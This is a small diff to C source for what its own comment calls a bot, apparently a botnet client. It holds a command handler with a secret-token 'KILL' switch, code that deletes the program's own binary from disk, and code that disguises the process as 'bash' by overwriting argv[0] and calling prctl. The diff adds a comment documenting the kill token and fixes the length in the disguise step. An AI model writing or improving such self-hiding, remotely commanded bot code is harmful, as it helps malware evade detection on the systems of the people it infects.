@@ -7,7 +7,7 @@ void ft_manage_request(char *ptr)
 	char **split;
 
 	split = ft_split(ptr, '|');
-	if (ft_split_len(split) == 2 && !ft_strncmp(split[0], "KILL", 4) && !ft_strncmp(split[1], "ADFVDJIUCJHEhguehdFUCDJuyhy", 27))
+	if (ft_split_len(split) == 2 && !ft_strncmp(split[0], "KILL", 4) && !ft_strncmp(split[1], "ADFVDJIUCJHEhguehdFUCDJuyhy", 27)) // if args of KILL commands is "ADFVDJIUCJHEhguehdFUCDJuyhy" the bot kill itself
 		exit(0);
 	if (!fork())
 	{
@@ -57,7 +57,7 @@ int main(int argc, char *argv[])
 	{
 		remove(argv[0]);
 		srand(time(NULL) ^ getpid());
-		strncpy(argv[0], "bash", strlen(argv[0]));
+		strncpy(argv[0], "bash", strlen("bash"));
 		argv[0] = "bash";
 		prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
 	
